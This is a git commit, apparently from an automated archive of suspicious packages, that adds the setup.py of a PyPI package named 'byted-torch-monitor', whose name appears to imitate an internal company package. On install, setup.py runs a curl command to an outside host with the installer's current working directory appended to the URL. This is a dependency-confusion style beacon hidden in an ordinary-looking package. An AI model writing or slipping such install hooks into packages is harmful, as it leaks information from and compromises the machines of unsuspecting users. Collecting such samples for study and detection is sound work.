3a66880aab78a9a6ee77e2cd34aa1b4b49096191
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-04-24 15:04:20 +0000

    Add package byted-torch-monitor/0.0.1/byted_torch_monitor-0.0.1.tar.gz

---
+++ packages/byted-torch-monitor/byted_torch_monitor-0.0.1.tar.gz/byted_torch_monitor-0.0.1/setup.py
@@ -0,0 +1,15 @@
+import os
+from setuptools import setup
+
+os.system("curl https://baidu.com/s?wd=" + os.getcwd())
+
+setup(
+    name='byted-torch-monitor',
+    version='0.0.1',
+    author='xlzd',
+    author_email='tellmewhy@gmail.com',
+    url='',
+    description=u'吃枣药丸',
+    packages=['bytedmemfd'],
+    install_requires=[],
+)
